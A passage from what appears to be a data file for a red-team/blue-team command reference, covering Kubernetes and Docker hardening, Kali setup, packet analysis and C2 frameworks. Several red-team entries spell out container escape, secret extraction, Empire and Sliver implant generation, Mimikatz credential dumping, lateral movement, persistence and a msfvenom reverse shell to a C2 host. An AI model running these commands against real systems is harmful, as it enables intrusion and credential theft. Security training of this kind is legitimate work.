      killchain: 'c2', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A09'] },
    { id: 'kube-bench', title: 'Kube-bench CIS Audit', team: 'blue', category: 'container-defense',
      description: 'Check Kubernetes cluster against CIS Kubernetes Benchmark.',
      tags: ['kubernetes', 'cis', 'hardening'], command: 'kubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- run --targets=master,node,etcd,policies\nkubectl logs kube-bench\nkubectl delete pod kube-bench',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'kubescape-scan', title: 'Kubescape Security Scan', team: 'blue', category: 'container-defense',
      description: 'Kubernetes security posture management with NSA/CISA framework.',
      tags: ['kubernetes', 'kubescape', 'hardening'], command: 'kubescape scan --enable-host-scan --format pretty-printer --submit',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'network-policy-deny', title: 'K8s Default Deny NetworkPolicy', team: 'blue', category: 'container-defense',
      description: 'Default deny all ingress/egress traffic in a namespace.',
      tags: ['kubernetes', 'network-policy', 'hardening'], command: 'kubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\nspec:\n  podSelector: {}\n  policyTypes: [Ingress, Egress]\nEOF',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'cosign-verify', title: 'Cosign Image Verification', team: 'blue', category: 'container-defense',
      description: 'Verify container image signatures with Sigstore cosign.',
      tags: ['cosign', 'sigstore', 'supply-chain'], command: 'cosign verify --key cosign.pub TARGET_IMAGE:latest',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A08'] },

    // ═════════════════════════════════════════════════════════
    //  DOCKER — management, security hardening, pentest labs
    // ═════════════════════════════════════════════════════════

    { id: 'docker-run-hardened', title: 'Docker Run (Hardened)', team: 'blue', category: 'docker',
      description: 'Run a container with security best practices: drop all capabilities, read-only filesystem, non-root user, resource limits.',
      tags: ['docker', 'hardening', 'containers'], command: '# Hardened container run\ndocker run --rm -it \\\n  --cap-drop=ALL \\\n  --cap-add=NET_BIND_SERVICE \\\n  --read-only \\\n  --user 1000:1000 \\\n  --memory=512m --cpus=0.5 --pids-limit=100 \\\n  --security-opt no-new-privileges:true \\\n  --security-opt seccomp=/path/to/seccomp.json \\\n  --network=none \\\n  TARGET_IMAGE:latest',
      killchain: 'installation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'docker-compose-lab', title: 'Pentest Lab (Docker Compose)', team: 'blue', category: 'docker',
      description: 'Spin up a full vulnerable web app lab with DVWA, Juice Shop, WebGoat, bWAPP, SQLi-Labs, and WrongSecrets.',
      tags: ['docker', 'docker-compose', 'pentest-lab', 'dvwa'], command: '# docker-compose.yml for pentest lab\ncat > docker-compose.yml << \'EOF\'\nversion: "3.8"\nservices:\n  dvwa:\n    image: sagikazarmark/dvwa\n    ports: ["8081:80"]\n  juice-shop:\n    image: bkimminich/juice-shop\n    ports: ["8082:3000"]\n  webgoat:\n    image: webgoat/webgoat-8.2\n    ports: ["8083:8080"]\n  sqli-labs:\n    image: acgpiano/sqli-labs\n    ports: ["8084:80"]\n  bwapp:\n    image: raesene/bwapp\n    ports: ["8085:80"]\n  wrongsecrets:\n    image: jeroenwillemsen/wrongsecrets:latest-no-vault\n    ports: ["8086:8080"]\nEOF\ndocker-compose up -d\n# Access: DVWA=:8081 JuiceShop=:8082 WebGoat=:8083\n# Reset: docker-compose down -v',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'docker-tls-remote', title: 'Docker TLS Remote Access', team: 'blue', category: 'docker',
      description: 'Configure Docker daemon with TLS encryption for secure remote management.',
      tags: ['docker', 'tls', 'encryption', 'remote'], command: '# Server: Start Docker daemon with TLS\ndockerd --tlsverify \\\n  --tlscacert=ca.pem \\\n  --tlscert=server-cert.pem \\\n  --tlskey=server-key.pem \\\n  -H=0.0.0.0:2376\n\n# Client: Connect with TLS\ndocker --tlsverify \\\n  --tlscacert=ca.pem \\\n  --tlscert=client-cert.pem \\\n  --tlskey=client-key.pem \\\n  -H=SERVER_IP:2376 info\n\n# Or use Docker context for SSH\ndocker context create remote --docker host=ssh://USER@SERVER_IP\ndocker context use remote\ndocker ps',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: ['A02'] },
    { id: 'docker-cap-audit', title: 'Container Capabilities Audit', team: 'red', category: 'docker',
      description: 'Enumerate container capabilities and identify exploitable privileges.',
      tags: ['docker', 'capabilities', 'privesc'], command: '# Inside container: check capabilities\ncapsh --print\ngrep Cap /proc/self/status\n# Decode capability hex:\ncapsh --decode=00000000a80425fb\n\n# Dangerous capabilities to look for:\n# CAP_SYS_ADMIN  → mount filesystems, escape\n# CAP_NET_ADMIN  → modify network\n# CAP_SYS_PTRACE → trace/debug processes\n# CAP_DAC_OVERRIDE → bypass file permissions\n\n# Exploit CAP_SYS_ADMIN (mount host disk):\nfdisk -l\nmount /dev/sda1 /mnt\nchroot /mnt',
      killchain: 'exploitation', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'docker-resource-audit', title: 'Docker Resource Limits Audit', team: 'blue', category: 'docker',
      description: 'Inspect and enforce CPU, memory, and PID limits on running containers.',
      tags: ['docker', 'resources', 'audit'], command: '# Check resource limits on container\ndocker inspect CONTAINER | grep -E "Memory|CpuQuota|PidsLimit"\n\n# Live resource usage\ndocker stats --no-stream\n\n# Update running container limits\ndocker update --memory=512m --cpus=2 --pids-limit=100 CONTAINER\n\n# Run with GPU limits (if applicable)\ndocker run --gpus all --cpus=2 --memory=4g TARGET_IMAGE',
      killchain: 'actions', attack: ['impact'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'docker-network-isolate', title: 'Docker Network Isolation', team: 'blue', category: 'docker',
      description: 'Create isolated Docker networks for container segmentation and security.',
      tags: ['docker', 'network', 'isolation', 'segmentation'], command: '# Create isolated network\ndocker network create --driver bridge --internal isolated_net\n\n# Create network with specific subnet\ndocker network create --subnet=172.20.0.0/16 pentest_net\n\n# Run container in isolated network\ndocker run --network=isolated_net --name db -d postgres\n\n# Connect container to multiple networks\ndocker network connect pentest_net web_container\n\n# Inspect network\ndocker network inspect isolated_net\n\n# List all networks\ndocker network ls',
      killchain: 'installation', attack: ['defense-evasion'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'docker-system-cleanup', title: 'Docker System Cleanup', team: 'blue', category: 'docker',
      description: 'Remove unused Docker resources — images, containers, volumes, networks.',
      tags: ['docker', 'cleanup', 'prune'], command: '# Full system prune (all unused resources)\ndocker system prune -a --volumes\n\n# Selective cleanup\ndocker container prune -f   # stopped containers\ndocker image prune -a -f     # unused images\ndocker volume prune -f       # orphaned volumes\ndocker network prune -f      # unused networks\n\n# Disk usage overview\ndocker system df\n\n# Remove specific dangling images\ndocker rmi $(docker images -q -f dangling=true)',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'docker-build-secure', title: 'Secure Dockerfile Build', team: 'blue', category: 'docker',
      description: 'Hardened Dockerfile template with multi-stage build, non-root user, and minimal base image.',
      tags: ['docker', 'dockerfile', 'build', 'hardening'], command: '# Secure Dockerfile template\ncat > Dockerfile << \'EOF\'\n# Multi-stage build\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --production\nCOPY . .\n\n# Minimal runtime\nFROM node:20-alpine\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\nWORKDIR /app\nCOPY --from=builder --chown=appuser:appgroup /app .\nUSER appuser\nEXPOSE 3000\nCMD ["node", "server.js"]\nEOF\n\n# Build with no-cache\ndocker build --no-cache -t myapp:latest .\n\n# Scan the built image\ntrivy image myapp:latest',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A05', 'A06'] },
    { id: 'docker-secrets-extract', title: 'Docker Secrets Extraction', team: 'red', category: 'docker',
      description: 'Extract secrets, environment variables, and credentials from Docker containers and images.',
      tags: ['docker', 'secrets', 'credentials'], command: '# Environment variables from running container\ndocker inspect CONTAINER --format="{{json .Config.Env}}"\n\n# Process environment (from inside)\ncat /proc/1/environ | tr "\\0" "\\n"\n\n# Image history (may reveal build secrets)\ndocker history --no-trunc TARGET_IMAGE\n\n# Search for secrets in layers\ndocker save TARGET_IMAGE | tar -xO | grep -rli "password\\|secret\\|key\\|token"\n\n# Docker Compose env files\nfind / -name ".env" -o -name "docker-compose*.yml" 2>/dev/null | xargs grep -l "PASSWORD\\|SECRET"',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'artifacts', owasp: ['A02'] },
    { id: 'docker-kali-container', title: 'Kali Linux Docker Container', team: 'red', category: 'docker',
      description: 'Run Kali Linux as a Docker container with persistent storage for quick pentest environments.',
      tags: ['docker', 'kali', 'pentest'], command: '# Run Kali container\ndocker run --name kali \\\n  -e TZ=UTC \\\n  -v kali-data:/root \\\n  --restart unless-stopped \\\n  -it kalilinux/kali-rolling\n\n# Inside container: install tools\napt update && apt upgrade -y\napt install -y kali-linux-default\n\n# Or full toolset (large)\napt install -y kali-linux-large\n\n# Re-enter running container\ndocker exec -it kali bash\n\n# Docker Compose version:\n# image: kalilinux/kali-rolling\n# volumes: [kali-data:/root]\n# restart: unless-stopped',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  SETUP — Kali, WSL, pentest environment configuration
    // ═════════════════════════════════════════════════════════

    { id: 'kali-wsl2-install', title: 'Kali Linux WSL2 Install', team: 'blue', category: 'setup',
      description: 'Install Kali Linux on Windows via WSL2 with full feature set.',
      tags: ['kali', 'wsl', 'install', 'windows'],
      commands: {
        windows: '# PowerShell (Admin):\nEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\nwsl --set-default-version 2\nwsl --install -d kali-linux\n\n# After reboot, in Kali terminal:\nsudo apt update && sudo apt upgrade -y\nsudo apt install -y kali-linux-default',
        linux: '# Not applicable — WSL is Windows-only\n# For Linux: use Docker or direct install\nsudo apt update && sudo apt install -y kali-linux-default',
        macos: '# Not applicable — WSL is Windows-only\n# For macOS: use Docker\ndocker run -it kalilinux/kali-rolling'
      },
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'kali-gui-xrdp', title: 'Kali GUI Setup (XFCE + xRDP)', team: 'blue', category: 'setup',
      description: 'Install XFCE desktop environment and xRDP for remote GUI access to Kali Linux WSL.',
      tags: ['kali', 'gui', 'xrdp', 'xfce'], command: '# Install XFCE desktop\nsudo apt install -y kali-desktop-xfce\n\n# Install xRDP for remote desktop\nsudo apt install -y xrdp\nsudo systemctl enable xrdp\nsudo ufw allow 3389/tcp\nsudo service xrdp start\n\n# Get IP address for RDP connection\nip addr | grep inet\n\n# Connect from Windows:\n# mstsc → enter WSL IP address\n\n# Kali Win-KeX (alternative for WSL):\nsudo apt install -y kali-win-kex\nkex --win -s',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'kali-tools-meta', title: 'Kali Tool Metapackages', team: 'blue', category: 'setup',
      description: 'Install Kali tools by category — top10, forensics, web, wireless, exploitation, and more.',
      tags: ['kali', 'tools', 'metapackage', 'install'], command: '# Essential categories\nsudo apt install -y kali-tools-top10           # Top 10 most popular\nsudo apt install -y kali-tools-web             # Web app testing\nsudo apt install -y kali-tools-passwords       # Password attacks\nsudo apt install -y kali-tools-forensics       # Digital forensics\nsudo apt install -y kali-tools-exploitation     # Exploit tools\nsudo apt install -y kali-tools-wireless        # WiFi attacks\nsudo apt install -y kali-tools-information-gathering  # Recon\nsudo apt install -y kali-tools-sniffing-spoofing     # Network\nsudo apt install -y kali-tools-reverse-engineering   # RE\nsudo apt install -y kali-tools-vulnerability  # Vuln scanning\nsudo apt install -y kali-tools-social-engineering    # Social\nsudo apt install -y kali-tools-crypto-stego   # Crypto & stego\nsudo apt install -y kali-tools-database       # DB tools\nsudo apt install -y kali-tools-detect         # Detection\nsudo apt install -y kali-tools-post-exploitation    # Post-exploit',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'kali-full-install', title: 'Kali Full System Install', team: 'blue', category: 'setup',
      description: 'Install complete Kali Linux metapackages — headless, large, or full everything bundle.',
      tags: ['kali', 'install', 'full', 'everything'], command: '# Tiers (smallest to largest):\nsudo apt install -y kali-system-core      # Bare minimum\nsudo apt install -y kali-system-cli       # CLI tools\nsudo apt install -y kali-linux-default    # Standard install\nsudo apt install -y kali-linux-large      # Extended toolset\nsudo apt install -y kali-linux-everything # ALL tools (~15GB+)\n\n# Headless (servers, no GUI)\nsudo apt install -y kali-linux-headless\n\n# GUI system\nsudo apt install -y kali-system-gui\n\n# NetHunter (mobile pentesting)\nsudo apt install -y kali-linux-nethunter',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'kali-pimp-script', title: 'Pimp My Kali', team: 'blue', category: 'setup',
      description: 'Automated Kali Linux optimization script — fixes common issues, installs missing tools, configures the environment.',
      tags: ['kali', 'pimp', 'automation', 'setup'], command: '# Pimp My Kali — automated setup\nsudo apt update && sudo apt -y upgrade\ngit clone https://github.com/Dewalt-arch/pimpmykali\ncd pimpmykali && sudo ./pimpmykali.sh\n\n# Manual essentials:\nsudo apt install -y build-essential git curl wget vim\nsudo apt install -y metasploit-framework\nsudo apt install -y aircrack-ng shellter\nsudo apt install -y software-properties-common\n\n# AD tools\npython3 -m pip install impacket\nsudo gem install evil-winrm\n\n# Verify\nmsfconsole -v && nmap -V && python3 --version',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'kali-ad-toolkit', title: 'Kali AD Pentest Toolkit Setup', team: 'red', category: 'setup',
      description: 'Install Active Directory pentesting tools — Impacket, evil-winrm, Kerbrute, BloodHound, CrackMapExec.',
      tags: ['kali', 'ad', 'impacket', 'evil-winrm', 'bloodhound'], command: '# Impacket (secretsdump, psexec, ntlmrelayx)\npython3 -m pip install impacket\n\n# evil-winrm (WinRM shell)\nsudo gem install evil-winrm\n# Alt: sudo apt install evil-winrm\n\n# Kerbrute (Kerberos brute-force)\nwget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64\nchmod +x kerbrute_linux_amd64 && sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\n\n# BloodHound + SharpHound\nsudo apt install -y bloodhound neo4j\nsudo neo4j console &\n# Default: neo4j/neo4j → change password\n\n# CrackMapExec\npip install crackmapexec\n\n# Verify\nimpacket-secretsdump --help && evil-winrm --help',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'wsl-integration', title: 'WSL2 Windows Integration', team: 'blue', category: 'setup',
      description: 'WSL2 tips — access Windows files, create shortcuts, configure Windows Terminal for Kali.',
      tags: ['wsl', 'windows', 'integration', 'terminal'],
      commands: {
        windows: '# List WSL distros\nwsl --list --verbose\n\n# Set default to Kali\nwsl --set-default kali-linux\n\n# Access Windows files from WSL\nls /mnt/c/Users/%USERNAME%/\n\n# Access WSL files from Windows\n# Explorer: \\\\wsl$\\kali-linux\\home\\user\n\n# Export/backup WSL distro\nwsl --export kali-linux D:\\Backups\\kali-backup.tar\n\n# Import/restore\nwsl --import kali-restored D:\\WSL\\Kali D:\\Backups\\kali-backup.tar',
        linux: '# N/A — WSL is Windows-only\necho "Use native Linux or Docker instead"',
        macos: '# N/A — WSL is Windows-only\necho "Use native Linux VM or Docker instead"'
      },
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'base-tool-installer', title: 'Base Tool Installer (Multi-OS)', team: 'blue', category: 'setup',
      description: 'Cross-platform base tool installation — git, curl, wget, vim, build essentials.',
      tags: ['install', 'tools', 'base', 'multi-os'],
      commands: {
        linux: '#!/bin/bash\nsudo apt-get update\nsudo apt-get install -y build-essential git curl wget vim\nsudo apt-get install -y python3 python3-pip\nsudo apt-get install -y net-tools nmap\necho "Linux base tools installed"',
        macos: '# Install Homebrew if missing\n/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"\nbrew update\nbrew install git curl wget vim python3 nmap\necho "macOS base tools installed"',
        windows: '# PowerShell (Admin) — using Chocolatey\nSet-ExecutionPolicy Bypass -Scope Process\niex ((New-Object System.Net.WebClient).DownloadString("https://community.chocolatey.org/install.ps1"))\nchoco install git curl wget vim python3 nmap -y\necho "Windows base tools installed"'
      },
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'pentest-env-verify', title: 'Pentest Environment Verification', team: 'blue', category: 'setup',
      description: 'Verify that all essential pentesting tools are installed and working correctly.',
      tags: ['verify', 'tools', 'check', 'pentest'], command: '#!/bin/bash\n# Pentest tool verification\ntools=("nmap" "metasploit" "sqlmap" "hydra" "nikto" "gobuster" "john" "hashcat" "aircrack-ng" "burpsuite" "wireshark" "netcat")\necho "=== Pentest Tool Check ===" \nfor t in "${tools[@]}"; do\n  if command -v "$t" &>/dev/null || dpkg -l | grep -q "$t"; then\n    echo "[OK] $t"\n  else\n    echo "[MISSING] $t"\n  fi\ndone\n\n# Service checks\necho "\\n=== Services ==="\nsudo service postgresql status 2>/dev/null && echo "[OK] PostgreSQL" || echo "[OFF] PostgreSQL"\nsudo service docker status 2>/dev/null && echo "[OK] Docker" || echo "[OFF] Docker"',
      killchain: 'recon', attack: ['resource-development'], pyramid: 'tools', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  NETWORK ANALYSIS — tcpdump, wireshark, tshark, PCAP
    // ═════════════════════════════════════════════════════════

    { id: 'tcpdump-capture', title: 'tcpdump Live Capture', team: 'blue', category: 'netanalysis',
      description: 'Capture live network traffic with tcpdump — filter by host, port, protocol.',
      tags: ['tcpdump', 'capture', 'packets', 'network'], command: '# Capture all traffic on any interface\nsudo tcpdump -i any -nn -c 100\n\n# Filter by host\nsudo tcpdump -i eth0 host 10.10.10.10 -nn\n\n# Filter by port (HTTP)\nsudo tcpdump -i any port 80 -A -s 0\n\n# DNS traffic only\nsudo tcpdump -i any port 53 -nn\n\n# Write to file\nsudo tcpdump -i eth0 -w capture.pcap -c 1000\n\n# ICMP only (ping, tunnels)\nsudo tcpdump -i eth0 icmp -w icmp.pcap',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'tcpdump-flags', title: 'tcpdump TCP Flag Filters', team: 'blue', category: 'netanalysis',
      description: 'Filter packets by TCP flags — SYN scans, RST floods, handshake analysis.',
      tags: ['tcpdump', 'tcp', 'flags', 'syn', 'rst'], command: '# SYN packets only (port scans)\ntcpdump -r capture.pcap "tcp[tcpflags] == tcp-syn"\n\n# SYN+ACK (connection responses)\ntcpdump -r capture.pcap "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"\n\n# RST packets (connection resets)\ntcpdump -r capture.pcap "tcp[tcpflags] == tcp-rst" | wc -l\n\n# Packets larger than 1500 bytes\ntcpdump -nn -r capture.pcap greater 1500\n\n# Show MAC addresses\ntcpdump -nn -r capture.pcap -e\n\n# ARP requests\ntcpdump -r capture.pcap arp -nn',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'wireshark-display-filters', title: 'Wireshark Display Filters', team: 'blue', category: 'netanalysis',
      description: 'Essential Wireshark display filters for traffic analysis and incident investigation.',
      tags: ['wireshark', 'filters', 'display', 'analysis'], command: '# IP and port filters\nip.addr == 10.10.10.10\ntcp.port == 443\nip.src == 192.168.1.0/24 && tcp.dstport == 80\n\n# Protocol filters\nhttp.request.method == "POST"\ndns.qry.name contains "evil"\ntls.handshake.type == 1\nftp.request.command == "PASS"\n\n# TCP analysis\ntcp.flags.syn == 1 && tcp.flags.ack == 0\ntcp.analysis.retransmission\ntcp.stream eq 5\n\n# Find anomalies\nhttp.response.code >= 400\nframe.len > 1500\ndata.len > 0',
      killchain: 'actions', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'wireshark-capture-filters', title: 'Wireshark Capture Filters', team: 'blue', category: 'netanalysis',
      description: 'Set capture-time filters in Wireshark for targeted packet collection.',
      tags: ['wireshark', 'capture', 'bpf', 'filters'], command: '# Host-specific capture\nhost 10.10.10.10\n\n# Port capture\nport 80 or port 443\n\n# Subnet\nnet 192.168.1.0/24\n\n# Protocol\ntcp\nicmp\n\n# Exclude noise\nnot port 22 and not arp\n\n# Specific host + port\nhost 10.10.10.10 and port 8080\n\n# Only SYN packets (stealth scan detection)\ntcp[tcpflags] & tcp-syn != 0',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'tshark-cli', title: 'TShark CLI Analysis', team: 'blue', category: 'netanalysis',
      description: 'TShark (CLI Wireshark) for headless packet analysis — extract fields, statistics, conversations.',
      tags: ['tshark', 'wireshark', 'cli', 'analysis'], command: '# Read PCAP with display filter\ntshark -r capture.pcap -Y "http.request"\n\n# Extract specific fields\ntshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.a\n\n# HTTP requests with URLs\ntshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri\n\n# Conversation statistics\ntshark -r capture.pcap -q -z conv,tcp\n\n# Protocol hierarchy\ntshark -r capture.pcap -q -z io,phs\n\n# Export HTTP objects\ntshark -r capture.pcap --export-objects http,./exported_files\n\n# Follow TCP stream\ntshark -r capture.pcap -q -z follow,tcp,ascii,0',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'pcap-analysis', title: 'PCAP Forensic Analysis', team: 'blue', category: 'netanalysis',
      description: 'Analyze PCAP files for indicators of compromise — extract files, credentials, C2 traffic.',
      tags: ['pcap', 'forensics', 'network', 'ioc'], command: '# Quick packet count\ntcpdump -r suspect.pcap | wc -l\n\n# Top talkers\ntshark -r suspect.pcap -q -z endpoints,ip\n\n# DNS queries (C2/exfil)\ntshark -r suspect.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort | uniq -c | sort -rn\n\n# Extract files from HTTP\ntshark -r suspect.pcap --export-objects http,./artifacts\n\n# Credential extraction\ntshark -r suspect.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg\ntshark -r suspect.pcap -Y "http.request.method == POST" -T fields -e http.file_data\n\n# TLS SNI (Server Name Indication)\ntshark -r suspect.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.extensions_server_name',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'dns-analysis', title: 'DNS Traffic Analysis', team: 'blue', category: 'netanalysis',
      description: 'Monitor and analyze DNS traffic for tunneling, exfiltration, and C2 communication.',
      tags: ['dns', 'analysis', 'tunneling', 'exfiltration'], command: '# Live DNS monitoring\nsudo tcpdump -i any port 53 -nn -l\n\n# DNS query types in PCAP\ntshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.qry.type\n\n# Detect DNS tunneling (long subdomains)\ntshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | awk -F. \'{if(length($1)>30) print}\'\n\n# High-volume TXT queries (data exfil)\ntshark -r capture.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name | sort | uniq -c | sort -rn\n\n# Unusual DNS response sizes\ntshark -r capture.pcap -Y "dns.resp.len > 512" -T fields -e dns.qry.name -e dns.resp.len',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'artifacts', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  C2 FRAMEWORKS — Empire, Sliver, Metasploit, detection
    // ═════════════════════════════════════════════════════════

    { id: 'empire-setup', title: 'PowerShell Empire Setup', team: 'red', category: 'c2',
      description: 'Start PowerShell Empire server, create HTTP listener, generate stager.',
      tags: ['empire', 'c2', 'powershell', 'listener'], command: '# Install (Kali)\nsudo apt install powershell-empire\n# Or Docker:\ndocker pull bcsecurity/empire && docker run -it bcsecurity/empire\n\n# Start server\nsudo powershell-empire server\n\n# In new terminal — connect client\npowershell-empire client\n\n# Create HTTP listener\n(Empire) > listeners\n(Empire: listeners) > uselistener http\n(Empire: listeners/http) > set Host http://C2_IP:80\n(Empire: listeners/http) > set Port 80\n(Empire: listeners/http) > execute\n\n# Generate stager\n(Empire) > usestager windows/launcher_bat\n(Empire: stager) > set Listener http\n(Empire: stager) > execute\n\n# Starkiller GUI: https://localhost:1337\n# Default: empireadmin / password123',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },
    { id: 'empire-post-exploit', title: 'Empire Post-Exploitation', team: 'red', category: 'c2',
      description: 'Empire agent interaction — credential harvesting, lateral movement, persistence modules.',
      tags: ['empire', 'post-exploitation', 'mimikatz', 'lateral'], command: '# Interact with agent\n(Empire) > agents\n(Empire: agents) > interact AGENT_NAME\n(Empire: AGENT) > shell whoami\n\n# Credential harvesting\n(Empire: AGENT) > usemodule credentials/mimikatz/logonpasswords\n(Empire: AGENT) > execute\n\n# Kerberoasting\n(Empire: AGENT) > usemodule credentials/invoke_kerberoast\n(Empire: AGENT) > execute\n\n# Lateral movement (PSExec)\n(Empire: AGENT) > usemodule lateral_movement/invoke_psexec\n(Empire: AGENT) > set ComputerName TARGET\n(Empire: AGENT) > set Listener http\n(Empire: AGENT) > execute\n\n# Persistence (registry)\n(Empire: AGENT) > usemodule persistence/userland/registry\n(Empire: AGENT) > execute\n\n# File transfer\n(Empire: AGENT) > upload /local/file.exe C:\\Temp\\file.exe\n(Empire: AGENT) > download C:\\Users\\target\\creds.txt',
      killchain: 'actions', attack: ['credential-access', 'lateral-movement'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'sliver-c2', title: 'Sliver C2 Framework', team: 'red', category: 'c2',
      description: 'Sliver C2 — start server, create mTLS listener, generate beacon implant.',
      tags: ['sliver', 'c2', 'mtls', 'beacon'], command: '# Start Sliver server\nsliver-server\n\n# Create mTLS listener\nsliver > mtls --lhost 0.0.0.0 --lport 8888\n\n# Generate beacon (Windows EXE)\nsliver > generate beacon --mtls C2_IP:8888 --os windows --arch amd64 --format exe --save ./beacon.exe\n\n# Generate session (Linux)\nsliver > generate --mtls C2_IP:8888 --os linux --arch amd64 --format elf --save ./implant\n\n# List active sessions\nsliver > sessions\nsliver > use SESSION_ID\n\n# HTTPS listener (domain fronting)\nsliver > https --lhost 0.0.0.0 --lport 443 --domain cdn.example.com\n\n# DNS C2\nsliver > dns --domains c2.example.com --lport 53',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },
    { id: 'metasploit-handler', title: 'Metasploit Multi/Handler', team: 'red', category: 'c2',
      description: 'Set up Metasploit handler for Meterpreter and reverse shell callbacks.',
      tags: ['metasploit', 'meterpreter', 'handler', 'c2'], command: '# Start Metasploit\nmsfconsole -q\n\n# Reverse TCP handler (Meterpreter)\nmsf6 > use exploit/multi/handler\nmsf6 > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 0.0.0.0\nmsf6 > set LPORT 4444\nmsf6 > exploit -j\n\n# Generate matching payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=C2_IP LPORT=4444 -f exe -o shell.exe\n\n# Meterpreter commands\nmeterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > hashdump\nmeterpreter > upload /local/file.exe C:\\\\Temp\\\\file.exe\nmeterpreter > portfwd add -l 3389 -p 3389 -r TARGET_IP\nmeterpreter > run post/multi/recon/local_exploit_suggester',
      killchain: 'c2', attack: ['command-control', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'c2-detection', title: 'C2 Beacon Detection', team: 'blue', category: 'c2',
      description: 'Detect C2 framework beaconing — Empire, Sliver, Cobalt Strike indicators.',
      tags: ['c2', 'detection', 'beacon', 'ioc'], command: '# Detect periodic beaconing (jitter analysis)\ntshark -r capture.pcap -Y "http" -T fields -e frame.time_delta_displayed -e ip.dst | sort | uniq -c | sort -rn\n\n# Empire indicators:\n# - Event ID 4104 (ScriptBlock Logging)\n# - Default User-Agent strings\n# - Base64-encoded PowerShell in event logs\nGet-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}\n\n# Sliver indicators:\n# - mTLS on non-standard ports\n# - High-volume DNS TXT queries\n# - Unsigned PE with embedded cert blob\n\n# Cobalt Strike indicators:\n# - Default Malleable C2 profile artifacts\n# - Named pipe: \\\\\\\\\\\\pipe\\\\msagent_*\n# - Beacon metadata in HTTP headers\n\n# Generic C2 detection (Sigma rule format):\n# title: Suspicious Outbound Connection Interval\n# detection: network_connection where dst_port not in (80,443) and connection_count > 100/hour',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'c2-opsec', title: 'C2 OPSEC Hardening', team: 'red', category: 'c2',
      description: 'Operational security for C2 — sleep/jitter, profile changes, redirectors, cert rotation.',
